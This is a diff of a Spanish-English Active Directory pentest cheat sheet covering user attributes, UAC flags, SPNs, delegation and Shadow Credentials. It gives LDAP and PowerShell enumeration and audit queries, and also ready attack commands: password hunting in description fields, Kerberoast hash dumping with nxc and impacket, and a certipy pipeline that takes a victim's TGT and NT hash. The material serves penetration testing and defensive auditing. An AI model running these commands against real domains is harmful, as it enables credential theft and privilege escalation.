@@ -22,295 +22,199 @@ linked:
 
 ## Critical User Attributes
 
-| **Atributo** | **Significado** | **Notas** |
+| **Atributo** | **Significado** | **Para qué sirve** |
 |:---:|:---:|:---:|
-| `samAccountName` | Login name (legacy) | Standard ID. |
-| `userPrincipalName` (UPN) | `user@dom.local` | Modern format. |
-| `sAMAccountType` | Object type numeric (805306368 = user) | Filter. |
-| `objectSid` | SID | RID extraction. |
-| `objectGUID` | Unique identifier | Persistent. |
-| `cn` (Common Name) | Display name typically | Adjacent. |
-| `displayName` | UI display | Adjacent. |
-| `givenName` | First name | OSINT clue. |
-| `sn` | Surname | OSINT clue. |
+| `samAccountName` | Login name (legacy DOMAIN\user) | ID en logs/queries. |
+| `userPrincipalName` | UPN `user@dom.local` | Modern auth. |
+| `objectSid` | SID | RID extraction + cross-domain. |
+| `description` | Free-text — passwords leak comunes | **Always check**. |
+| `comment` / `info` | Free-text alternativos | Misma razón. |
 | `mail` | Email | Phishing prep. |
-| `mailNickname` | Email alias | Edge. |
-| `description` | Free-text — passwords leak frecuentemente | Always check. |
-| `comment` | Alt free-text | Check too. |
-| `info` | Notes field | Sometimes used. |
-| `title` | Job title | OSINT. |
-| `department` | Department | OSINT. |
-| `company` | Company | OSINT. |
-| `manager` | Manager DN | Org chart hint. |
-| `homeDirectory` | UNC path | SMB asset. |
-| `homeDrive` | Mapped drive | Adjacent. |
-| `scriptPath` | Logon script | Scriptable. |
-| `profilePath` | Roaming profile | Edge. |
-| `pwdLastSet` | Last password change | Stale check. |
-| `lastLogonTimestamp` | Last logon (replicated, ~14d delay) | Activity. |
-| `lastLogon` | Last logon (per-DC, real-time) | Per-DC. |
-| `accountExpires` | Expiration | Adjacent. |
-| `whenCreated` / `whenChanged` | Lifecycle | Audit. |
-| `userAccountControl` | UAC flags bitfield | Critical. |
-| `memberOf` | Direct group membership | Privilege. |
-| `tokenGroups` | Transitive group membership | Recursive. |
-| `servicePrincipalName` | SPNs | Kerberoast. |
-| `msDS-AllowedToDelegateTo` | Constrained delegation | Critical. |
-| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD | Critical. |
-| `msDS-KeyCredentialLink` | Shadow Credentials | NgC abuse. |
+| `title` / `department` / `manager` | Org metadata | OSINT + tier inference. |
+| `pwdLastSet` | Last password change | Stale check (spray candidate >2y). |
+| `lastLogonTimestamp` | Last logon (replicated, ~14d delay) | Live vs stale. |
+| `lastLogon` | Last logon real (per-DC) | Necesita query a todos DCs. |
+| `userAccountControl` | UAC bitfield | Detect flags peligrosos. |
+| `memberOf` | Group memberships directos | Privilege overview. |
+| `tokenGroups` | Memberships transitivos (recursive) | Tier 0 efectivo. |
+| `servicePrincipalName` | SPNs | Kerberoast targets. |
+| `msDS-AllowedToDelegateTo` | Constrained delegation | Privesc S4U. |
+| `msDS-KeyCredentialLink` | Shadow Credentials (NgC keys) | Modern abuse vector. |
+| `adminCount` | =1 si en priv group (AdminSDHolder) | Tier 0 marker. |
+| `homeDirectory` / `scriptPath` / `profilePath` | UNC paths | SMB asset discovery. |
 ^ad-attrs-critical
 
-### Attribute query templates
-
 ```bash
-# Concise critical attrs
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
+# Atributos críticos en una pasada
+ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" \
   "(&(objectCategory=user)(!(objectClass=computer)))" \
-  samAccountName userPrincipalName description \
+  samAccountName userPrincipalName description comment \
   pwdLastSet lastLogonTimestamp userAccountControl \
   memberOf servicePrincipalName \
-  msDS-AllowedToDelegateTo
+  msDS-AllowedToDelegateTo msDS-KeyCredentialLink adminCount
 
-# Free-text fields (description leakage)
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(|(description=*pass*)(description=*Pass*)(comment=*pass*)))" \
-  samAccountName description comment
+# Hunt creds en free-text
+ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" \
+  "(&(objectCategory=user)(|(description=*pass*)(description=*pwd*)(comment=*pass*)(info=*pass*)))" \
+  samAccountName description comment info
 ```
 
 ```powershell
-# RSAT
-Get-ADUser -Filter * -Properties Description,Comment,Info,Title,Department,Company,Manager |
-  Where {$_.Description -match "pass" -or $_.Comment -match "pass"} |
-  Select Name,SamAccountName,Description,Comment,Info,Title
+# RSAT — description leak hunt
+Get-ADUser -Filter * -Properties Description,Comment,Info,Title,Department |
+  Where { $_.Description -match "(?i)pass|pwd|secret|cred" -or $_.Comment -match "(?i)pass" } |
+  Select Name,SamAccountName,Description,Comment,Info
 ```
 
 ___
 
 ## userAccountControl (UAC) Flags Decoded
 
-| **Hex** | **Decimal** | **Flag** | **Significado** |
+| **Hex** | **Decimal** | **Flag** | **Importancia** |
 |:---:|:---:|:---:|:---:|
-| 0x00000001 | 1 | SCRIPT | Logon script run. |
-| 0x00000002 | 2 | ACCOUNTDISABLE | Account disabled. |
-| 0x00000008 | 8 | HOMEDIR_REQUIRED | Home dir required. |
-| 0x00000010 | 16 | LOCKOUT | Account locked. |
-| 0x00000020 | 32 | PASSWD_NOTREQD | **Password not required** (vuln). |
-| 0x00000040 | 64 | PASSWD_CANT_CHANGE | User can't change pwd. |
-| 0x00000080 | 128 | ENCRYPTED_TEXT_PWD_ALLOWED | **Reversible encryption** (DCSync recoverable). |
-| 0x00000100 | 256 | TEMP_DUPLICATE_ACCOUNT | Local user from another domain. |
-| 0x00000200 | 512 | NORMAL_ACCOUNT | Default user account. |
-| 0x00000800 | 2048 | INTERDOMAIN_TRUST_ACCOUNT | Trust account. |
-| 0x00001000 | 4096 | WORKSTATION_TRUST_ACCOUNT | Computer account. |
-| 0x00002000 | 8192 | SERVER_TRUST_ACCOUNT | DC account. |
-| 0x00010000 | 65536 | DONT_EXPIRE_PASSWORD | **Password never expires**. |
-| 0x00020000 | 131072 | MNS_LOGON_ACCOUNT | MNS logon account. |
-| 0x00040000 | 262144 | SMARTCARD_REQUIRED | Smartcard required. |
-| 0x00080000 | 524288 | TRUSTED_FOR_DELEGATION | **Unconstrained delegation** (CRITICAL). |
-| 0x00100000 | 1048576 | NOT_DELEGATED | Cannot be delegated. |
-| 0x00200000 | 2097152 | USE_DES_KEY_ONLY | DES only. |
-| 0x00400000 | 4194304 | DONT_REQ_PREAUTH | **AS-REP roastable** (CRITICAL). |
-| 0x00800000 | 8388608 | PASSWORD_EXPIRED | Password expired. |
-| 0x01000000 | 16777216 | TRUSTED_TO_AUTH_FOR_DELEGATION | **Constrained delegation w/protocol transition**. |
+| 0x0002 | 2 | `ACCOUNTDISABLE` | Filter audit. |
+| 0x0010 | 16 | `LOCKOUT` | Triage. |
+| 0x0020 | 32 | `PASSWD_NOTREQD` | Vuln signal. |
+| 0x0040 | 64 | `PASSWD_CANT_CHANGE` | Audit. |
+| 0x0080 | 128 | `ENCRYPTED_TEXT_PWD_ALLOWED` | **Reversible encryption — DCSync recoverable**. |
+| 0x0200 | 512 | `NORMAL_ACCOUNT` | Default user. |
+| 0x0800 | 2048 | `INTERDOMAIN_TRUST_ACCOUNT` | Trust account TDO. |
+| 0x1000 | 4096 | `WORKSTATION_TRUST_ACCOUNT` | Computer (workstation). |
+| 0x2000 | 8192 | `SERVER_TRUST_ACCOUNT` | DC. |
+| 0x10000 | 65536 | `DONT_EXPIRE_PASSWORD` | Static password (audit). |
+| 0x40000 | 262144 | `SMARTCARD_REQUIRED` | Hardening flag. |
+| 0x80000 | 524288 | `TRUSTED_FOR_DELEGATION` | **Unconstrained delegation (CRITICAL)**. |
+| 0x100000 | 1048576 | `NOT_DELEGATED` | Tier 0 protection (debe estar set). |
+| 0x200000 | 2097152 | `USE_DES_KEY_ONLY` | Legacy DES (vuln). |
+| 0x400000 | 4194304 | `DONT_REQ_PREAUTH` | **AS-REP roastable (CRITICAL)**. |
+| 0x1000000 | 16777216 | `TRUSTED_TO_AUTH_FOR_DELEGATION` | **Constrained delegation con protocol transition**. |
 ^ad-attrs-uac
 
-### UAC bitwise queries
+**Bitwise filter syntax LDAP:** `userAccountControl:1.2.840.113556.1.4.803:=<decimal>`. Match exact bits set.
 
 ```bash
-# AS-REP roastable (DONT_REQ_PREAUTH = 4194304)
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samAccountName
+LS="ldapsearch -h <DC> -D 'corp\\u' -w pass -b DC=corp,DC=local"
+UAC="userAccountControl:1.2.840.113556.1.4.803"
 
-# Unconstrained delegation users (TRUSTED_FOR_DELEGATION = 524288)
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" samAccountName
+# AS-REP roastable
+$LS "(&(objectCategory=user)($UAC:=4194304))" samAccountName
 
-# Password not required (PASSWD_NOTREQD = 32)
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" samAccountName
+# Unconstrained delegation
+$LS "(&(objectCategory=user)($UAC:=524288))" samAccountName
 
-# Password never expires (DONT_EXPIRE_PASSWORD = 65536)
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" samAccountName
+# Password not required
+$LS "(&(objectCategory=user)($UAC:=32))" samAccountName
 
-# Reversible encryption (ENCRYPTED_TEXT_PWD_ALLOWED = 128)
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))" samAccountName
+# Reversible encryption (high-value DCSync)
+$LS "(&(objectCategory=user)($UAC:=128))" samAccountName
 
-# Disabled accounts
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" samAccountName
+# Password never expires (static)
+$LS "(&(objectCategory=user)($UAC:=65536))" samAccountName
+
+# DES only (legacy)
+$LS "(&(objectCategory=user)($UAC:=2097152))" samAccountName
 ```
 
 ___
 
 ## SPN (servicePrincipalName) Attribute
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| SPN format | `service/host:port` | Standard. |
-| Common SPN classes | HTTP, MSSQLSvc, CIFS, host, RestrictedKrbHost | Common. |
-| MSSQLSvc | SQL Server | Kerberoast target. |
-| HTTP/host | Web servers | Kerberoast target. |
-| LDAP/host | Domain controller | Standard. |
-| RestrictedKrbHost | Generic | Standard. |
-| User SPN = service account | User-style account with SPN | Kerberoastable. |
-| `setspn -L <user>` | List user's SPNs | Native. |
-| `setspn -Q */*` | Query all SPNs | Native. |
-| `setspn -T <dom> -Q */*` | Cross-domain | Adjacent. |
-| Multiple SPNs per user | Comma-separated values | Standard. |
-| SPN duplicate check | `setspn -X` | Detection. |
-| Self-targeted Kerberoast | Force SPN onto target user | ACL combo. |
-| LDAP filter for SPN-bound | `(servicePrincipalName=*)` | Bitwise. |
-| Service account naming | `svc-*`, `*-svc`, `service-*` | Pattern. |
-| Computer SPNs | Hostname-based | Adjacent. |
+| `ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName` | Users con SPN (kerberoastables) | Pre-attack. |
+| `ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=MSSQLSvc/*))"` | Solo SQL service accounts | DB targets. |
+| `ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=HTTP/*))"` | HTTP service accounts | Web targets. |
+| `setspn -Q */*` | Todos SPNs (Windows native) | Sin LDAP tools. |
+| `setspn -L <user>` | SPNs de un user | Per-user. |
+| `setspn -T <foreign-dom> -Q */*` | Cross-domain | Forest-wide. |
+| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr ServicePrincipalName` | RSAT | Standard. |
+| `Get-DomainUser -SPN` (PowerView) | Adversary tool | Sin RSAT. |
+| `nxc ldap <DC> -u u -p p --kerberoasting kerb.txt` | SPN enum + dump TGS hashes | Kerberoast bulk. |
+| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request` | Kerberoast con TGS dump | Linux. |
 ^ad-attrs-spn
 
-### SPN enumeration
-
-```bash
-# All user SPNs (Kerberoast targets)
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(servicePrincipalName=*))" \
-  samAccountName servicePrincipalName
-
-# Specific service type
-ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=MSSQLSvc/*))" \
-  samAccountName servicePrincipalName
-
-# netexec wrapper
-nxc ldap DC -u user -p pass --kerberoasting kerb.txt
-```
+**SPN classes comunes:** `MSSQLSvc/*`, `HTTP/*`, `CIFS/*`, `host/*`, `LDAP/*`, `RestrictedKrbHost/*`, `WSMAN/*`, `TERMSRV/*`.
 
 ```powershell
-# RSAT
-Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName |
-  Select Name,SamAccountName,@{n='SPNs';e={$_.ServicePrincipalName -join '; '}}
-
-# PowerView
-Get-DomainUser -SPN | Select Name,ServicePrincipalName
+# Service accounts con SPNs (kerberoast targets)
+Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName,AdminCount,LastLogonDate |
+  Select Name,SamAccountName,AdminCount,LastLogonDate,
+         @{n='SPNs';e={$_.ServicePrincipalName -join '; '}} |
+  Sort AdminCount -Descending  # priv kerberoastable primero
 ```
 
 ___
 
 ## Delegation Attributes
 
-| **Atributo** | **Significado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `userAccountControl & 0x80000` | Unconstrained delegation flag | UAC. |
-| `userAccountControl & 0x1000000` | Constrained delegation w/protocol transition | UAC. |
-| `msDS-AllowedToDelegateTo` | Constrained delegation target services | LDAP. |
-| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD configured | Computer attr typically. |
-| `msDS-DelegationConfig` | Edge | Adjacent. |
-| `Account is sensitive and cannot be delegated` | Defender flag | UAC bit. |
-| `Account is trusted for delegation` | UAC checkbox | UAC bit. |
-| `Trust this user for delegation to specified services only` | Constrained | GUI label. |
-| `Use Kerberos only` | No protocol transition | Stricter constrained. |
-| `Use any authentication protocol` | Protocol transition allowed | More permissive. |
-| RBCD on user (rare) | Atypical | Edge. |
-| RBCD on computer (common) | Standard | Standard. |
-| Detection: delegation enable events | Defender | Adjacent. |
-| Tier 0 should have NOT_DELEGATED set | UAC bit | Hardening. |
-| Service accounts often have constrained delegation | Common | Standard. |
-| BloodHound delegation edges | Visual | Tool. |
+| `Get-ADUser -Filter {TrustedForDelegation -eq $true}` | Users con UD | Critical (raro en users). |
+| `Get-ADUser -Filter * -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo` | Users con constrained delegation | Privesc S4U. |
+| `Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}` | Users con protocol transition | S4U2Self abuse. |
+| `Get-ADUser -Filter {AccountNotDelegated -eq $true}` | Users con `NOT_DELEGATED` (Tier 0 protected) | Hardening confirmar. |
+| `ldapsearch ... "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" samAccountName msDS-AllowedToDelegateTo` | LDAP raw constrained | Linux. |
 ^ad-attrs-delegation
 
-### Delegation queries
+**Cuándo importa:**
+- Tier 0 (Domain Admins) **debe** tener `NOT_DELEGATED` ON o estar en `Protected Users` group.
+- Service accounts con constrained delegation = privesc path via S4U2Self/S4U2Proxy.
+- Users con UD (raro, casi siempre computers) = TGT capture potencial.
 
-```bash
-# Unconstrained delegation users
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
-  samAccountName memberOf
-
-# Constrained delegation users
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" \
-  samAccountName msDS-AllowedToDelegateTo userAccountControl
-
-# Protocol transition users (any auth protocol)
-ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
-  samAccountName msDS-AllowedToDelegateTo
+```powershell
+# Audit completo delegation users
+Get-ADUser -Filter {TrustedForDelegation -eq $true -or msDS-AllowedToDelegateTo -like "*" -or TrustedToAuthForDelegation -eq $true} `
+  -Properties TrustedForDelegation,msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,AdminCount |
+  Select Name,SamAccountName,AdminCount,TrustedForDelegation,
+         @{n='ConstrainedTo';e={$_.'msDS-AllowedToDelegateTo' -join '; '}},
+         TrustedToAuthForDelegation
 ```
 
 ___
 
 ## Shadow Credentials (msDS-KeyCredentialLink)
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `msDS-KeyCredentialLink` attribute | NgC public key entries | Modern auth. |
-| NgC = Next-Generation Credentials | PKI-based AD auth | Standard. |
-| Shadow Credentials abuse | Add own cert to victim → auth as victim | Privilege. |
-| Required permission | GenericAll, GenericWrite, or specific WriteProperty | ACL combo. |
-| `certipy shadow auto` | Automated abuse | Tool. |
-| Stealthier than ForceChangePassword | No pwd change | OPSEC. |
-| Multiple keys allowed | Multi-cert per user | Edge. |
-| Per-user setting | Granular | Standard. |
-| Detection: 4742 (computer change) or 4738 (user change) | Defender events | Adjacent. |
-| Modern Windows 10/11 + Server 2016+ | Required for NgC | Compatibility. |
-| Adjacent: Windows Hello for Business | NgC backbone | Modern. |
-| Adjacent: TPM key-based auth | NgC | Modern. |
-| Audit users with KeyCred set | Anomaly detection | Defender. |
-| Restrict KeyCred write permission | Hardening | Defense. |
-| Removal post-attack | Cleanup | OPSEC. |
-| Detection: AS-REQ with PKINIT extra cert | Anomaly | Defender. |
+| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Users con KeyCred set | Audit (anomaly hunt). |
+| `Get-ADObject "CN=victim,..." -Pr msDS-KeyCredentialLink` | Per-user KeyCred entries | Forensic detail. |
+| `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Add+abuse KeyCred (privesc) | Si tenés `WriteProperty` sobre victim. |
+| `certipy shadow list -u u -p pass -account victim -dc-ip <DC>` | Listar KeyCred existentes | Pre-modify check. |
+| `certipy shadow clear -u u -p pass -account victim -dc-ip <DC>` | Clear KeyCred (cleanup) | Post-engagement. |
 ^ad-attrs-shadowcreds
 
-### Shadow Credentials enumeration
+**Por qué es stealth:** no cambia password, no resetea cuenta. Solo añade public key al atributo. Auth posterior vía PKINIT (cert) → recibís TGT del victim. Stealthier que `Reset-ADAccountPassword`.
 
 ```bash
-# Users with KeyCredentialLink set
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(msDS-KeyCredentialLink=*))" \
-  samAccountName
+# Pipeline completo certipy
+certipy shadow list -u atacante -p pass -account 'victim' -dc-ip <DC>
+certipy shadow auto -u atacante -p pass -account 'victim' -dc-ip <DC>
+# Output: TGT + NT hash de victim
 
-# certipy abuse (privileged)
-certipy shadow auto -u user -p pass -account victim -dc-ip DC
-
-# Audit existing entries
-Get-ADObject "CN=victim,CN=Users,DC=dom,DC=local" -Properties msDS-KeyCredentialLink
+# Cleanup
+certipy shadow clear -u atacante -p pass -account 'victim' -dc-ip <DC>
 ```
 
 ___
 
-## Detection Patterns
+## Detection / Audit Patterns
 
-| **Atributo** | **Anomaly Indicator** | **Notas** |
+| **Comando** | **Qué detecta** | **Por qué importa** |
 |:---:|:---:|:---:|
-| Description contains password | Common leak | Free-text audit. |
-| pwdLastSet very old (>5y) | Stale | Spray candidate. |
-| Recently created admin user | Possible attacker creation | Detection. |
-| User in Tier 0 OU but recent creation | Anomaly | Investigate. |
-| servicePrincipalName recently added | Targeted Kerberoast | Suspicious. |
-| msDS-KeyCredentialLink recently set | Shadow Credentials | Suspicious. |
-| sIDHistory on non-migrated user | Edge | Investigate. |
-| TRUSTED_FOR_DELEGATION on non-DC | Risky | Investigate. |
-| DONT_REQ_PREAUTH | Default disabled | Vuln if set. |
-| Multiple userAccountControl flag changes | History audit | Defender. |
-| Account enabled then disabled | Honeytoken pattern | Edge. |
-| logonCount = 0 | Never used | Audit. |
-| BadPasswordCount high | Brute target signal | Adjacent. |
-| LastBadPasswordAttempt recent | Active brute attempt | Detection. |
-| AccountExpires past + still enabled | Edge bug | Adjacent. |
-| Foreign sIDHistory | Cross-trust migration | Audit. |
+| `Get-ADUser -Filter {AdminCount -eq 1 -and whenCreated -gt (Get-Date).AddDays(-30)}` | Admin users creados últimos 30d | Atacante persistence. |
+| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and AdminCount -eq 1}` | DA + AS-REP roastable | Critical vuln. |
+| `Get-ADUser -Filter * -Pr Description \| ? Description -match "(?i)pass\|pwd\|secret\|temp"` | Description con keywords | Cred leak. |
+| `Get-ADGroupMember "Domain Admins" -Recursive \| Get-ADUser -Pr LastLogonDate,PasswordLastSet \| ? LastLogonDate -lt (Get-Date).AddDays(-180)` | DAs stale 180d | Audit cleanup. |
+| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink,whenChanged \| ? {$_.'msDS-KeyCredentialLink' -and $_.whenChanged -gt (Get-Date).AddDays(-7)}` | KeyCred añadidos última semana | Shadow Cred persistence. |
+| `Get-ADUser -Filter {SIDHistory -ne "$null"}` | Users con sIDHistory | Migration audit / SID History abuse. |
+| `Get-ADUser -Filter * -Pr LogonCount \| ? LogonCount -eq 0` | Users nunca logueados | Stale o honey-token. |
 ^ad-attrs-detection
 
-### Anomaly detection queries
-
 ```powershell
-# Recently created admin users
-$recent = (Get-Date).AddDays(-30)
-Get-ADUser -Filter {AdminCount -eq 1 -and whenCreated -gt $recent} `
-  -Properties whenCreated,AdminCount
-
-# Users with description containing "pass" (case-insensitive)
-Get-ADUser -Filter * -Properties Description |
-  Where {$_.Description -match "pass|secret|key|cred"} |
-  Select Name,SamAccountName,Description
-
-# Suspicious UAC combinations
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and AdminCount -eq 1} `
-  -Properties UserAccountControl,AdminCount
-
-# Stale users in privileged groups
-$stale = (Get-Date).AddDays(-180)
-Get-ADGroupMember "Domain Admins" -Recursive |
-  Get-ADUser -Properties LastLogonDate,PasswordLastSet |
-  Where {$_.LastLogonDate -lt $stale -or -not $_.LastLogonDate}
+# Snapshot priv group anomalies
+Get-ADGroupMember "Domain Admins" -Recursive | Get-ADUser -Properties LastLogonDate,PasswordLastSet,whenCreated,Description |
+  Select Name,SamAccountName,whenCreated,LastLogonDate,PasswordLastSet,Description |
+  Sort whenCreated -Descending
 ```
 
 ***
